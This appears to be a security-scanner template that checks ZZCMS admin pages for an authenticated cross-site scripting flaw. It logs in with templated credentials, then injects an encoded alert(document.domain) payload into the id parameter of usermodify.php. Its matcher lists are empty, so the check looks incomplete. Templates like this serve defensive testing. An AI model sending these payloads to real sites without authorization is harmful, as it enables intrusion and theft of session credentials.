id: zzcms-xss
brief:
    title: ZZCMS - Cross-Site Scripting
    by: ritikchaddha
    level: high
    about: ZZCMS contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.
    label:
        - zzcms
        - xss
        - authenticated
        - vuln
    score: CVSS:7.2
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/admin/logincheck.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: admin={{username}}&pass={{password}}
      signs: []
    - verb: GET
      to:
        - '{{BaseURL}}/admin/usermodify.php?id=1%22%2balert(document.domain)%2b%22'
      signs: []
